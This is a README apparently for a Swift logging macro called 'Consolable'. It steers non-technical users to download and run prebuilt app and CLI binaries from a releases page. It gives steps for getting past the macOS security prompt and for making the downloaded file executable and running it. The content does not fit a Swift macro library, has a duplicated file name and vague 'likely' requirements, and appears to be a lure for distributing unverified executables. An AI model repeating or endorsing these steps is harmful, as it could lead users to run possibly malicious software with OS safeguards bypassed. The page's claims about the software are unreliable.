[![Download Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Keira-1699/Consolable/releases)

# 1. 🚀 Consolable
Consolable — 📦 Swift Macro simplifying logging with OSLog

This project helps Swift developers add structured logging with OSLog using a small macro. It works across Apple platforms and with Swift Package Manager. This README guides a non-technical user to find, download, and run the files on the Releases page.

Topics: console, logging, logging-helper, multi-platform, oslog, swift, swift-compiler, swift-macro, swift-package, swift-package-manager

---

# 2. 📥 Download & Install
Visit this page to download:
https://github.com/Keira-1699/Consolable/releases

Follow these steps. Each step uses plain language. If you see words you do not know, skip them and try the next step.

Steps for any computer:
1. Click the link above or paste it into your web browser address bar.
2. The page shows releases. Look for the one marked "Latest release" or a version like "v1.0.0".
3. Under that release, find a list called "Assets".
4. Pick the file that matches your computer:
   - macOS app: Consolable-mac.zip
   - macOS command-line tool: Consolable-mac-cli.zip
   - Linux command-line tool: Consolable-linux.tar.gz
   - Source package: Consolable-source.zip
5. Click the file name. Your browser will download it. Wait until the download finishes.

macOS install (app file):
1. Open Finder and go to your Downloads folder.
2. Double-click Consolable-mac.zip to unzip it.
3. Drag Consolable.app to the Applications folder.
4. Open Applications and double-click Consolable.app to run it.

macOS install (command-line tool) — if you prefer no GUI:
1. Open the Downloads folder.
2. Double-click Consolable-mac-cli.zip to unzip.
3. Inside you find a file named "consolable".
4. Double-click the file to run it. If nothing happens, continue with the Optional Terminal steps below.

Linux install (command-line tool):
1. Open your Downloads folder.
2. Right-click Consolable-linux.tar.gz and choose "Extract".
3. Open the extracted folder and double-click the file named "consolable" to run.
4. If double-click does not run, use the Optional Terminal steps below.

Optional Terminal steps (copy and paste):
- macOS CLI:
  - Open Terminal app.
  - Type: cd ~/Downloads
  - Type: chmod +x consolable
  - Type: ./consolable
- Linux CLI:
  - Open your terminal app.
  - Type: cd ~/Downloads
  - Type: tar -xzf Consolable-linux.tar.gz
  - Type: chmod +x consolable
  - Type: ./consolable

If you need the release page again, use this link:
https://github.com/Keira-1699/Consolable/releases

---

# 3. ▶️ Run Consolable and check it works
What to expect when you open the app or run the tool.

If you opened the macOS app:
- A small window appears.
- The window shows a message like "Consolable is running".
- The app may show sample log messages in the window.

If you ran the command-line tool:
- A line of text appears that shows a sample log message.
- The tool prints a few lines and then stops.

How to confirm logs:
- The app shows example logs inside its window.
- The CLI prints logs to the terminal.
- On macOS, you can also open Console.app and look for messages with the name "Consolable" in the process column.

---

# 4. 🔧 Common issues and fixes
If download fails:
- Check your internet connection.
- Try a different browser.
- Try again after a few minutes.

If file will not open on macOS:
- Right-click the app and choose "Open".
- If a dialog appears, choose "Open" again to allow the app to run.

If the CLI does not run:
- Make the file executable. See the Optional Terminal steps above.
- If you see "Permission denied", use the chmod command shown above.

If logs do not appear:
- If you ran the CLI, run it again in a terminal window. The terminal shows the output.
- If you used the app, look in Console.app on macOS and filter by "Consolable".

If you see an error message you do not understand:
- Copy or take a screenshot of the error.
- Send the message when you ask for help (see Support section).

---

# 5. 🧰 System requirements & supported platforms
These are the likely requirements for the released files. Follow them to avoid problems.

For macOS app:
- macOS 12.0 or later
- Apple silicon (M1/M2) or Intel CPU
- 50 MB free disk space

For macOS CLI:
- macOS 12.0 or later
- Terminal app or other shell
- Swift runtime included in the binary

For Linux CLI:
- A modern Linux distribution (Ubuntu 20.04 or newer)
- 64-bit CPU
- 20 MB free disk space

Developer details (for context):
- Built with Swift 5.9
- Works with Swift Package Manager as a macro or helper
- Uses OSLog for system logging on Apple platforms

---

# 6. ✨ Features
Consolable provides these capabilities:
- A Swift macro that adds structured logs with OSLog
- Small runtime footprint
- Support for macOS, iOS, watchOS, tvOS
- Prebuilt command-line tools for quick testing
- A macOS app for visual testing and demo logs
- Swift Package Manager support for developers

---

# 7. 📦 Files you will find on the Releases page
Each release contains a set of files. Here is what they mean.

- Consolable-mac.zip or Consolable-mac.zip:
  - A macOS app you can run by double-clicking.
- Consolable-mac-cli.zip:
  - A command-line tool for macOS. Run it in Terminal.
- Consolable-linux.tar.gz:
  - A command-line tool for Linux.
- Consolable-source.zip:
  - The full source code in a zip file. Developers use this to build the project.
- Checksums and signatures:
  - Files that let advanced users verify the download.

Which file to pick:
- If you want a clickable app: pick Consolable-mac.zip.
- If you want to run a command: pick the CLI file for your OS.
- If you want source code: pick the source zip.

---

# 8. ❓ FAQ (for absolute beginners)
Q: I do not know what a "release" is.  
A: A release is a ready-made file you can download and run.

Q: Which file should I download for my Mac?  
A: Choose Consolable-mac.zip for the app. Choose Consolable-mac-cli.zip if you want the command-line tool.

Q: I am on Windows. Can I run Consolable?  
A: Prebuilt files target macOS and Linux. On Windows you can try a Linux environment or use the source with a developer.

Q: I clicked a file and nothing happened. What now?  
A: Check your Downloads folder. Double-click the file to open it. If the file is zipped, unzip it first.

Q: Who can help if I get stuck?  
A: Use the Support section below. Provide a screenshot or copy of the error message.

---

# 9. 🤝 Support
If you need help:
- Open the Releases page and note the release version you tried.
- Take a screenshot of any error.
- Create an issue on the GitHub repository (if you can). Link: https://github.com/Keira-1699/Consolable/issues
- If you cannot create an issue, send the screenshots and a short note about your computer and the file you downloaded.

---

Thank you for trying Consolable. Visit the releases to get the file that matches your computer:
https://github.com/Keira-1699/Consolable/releases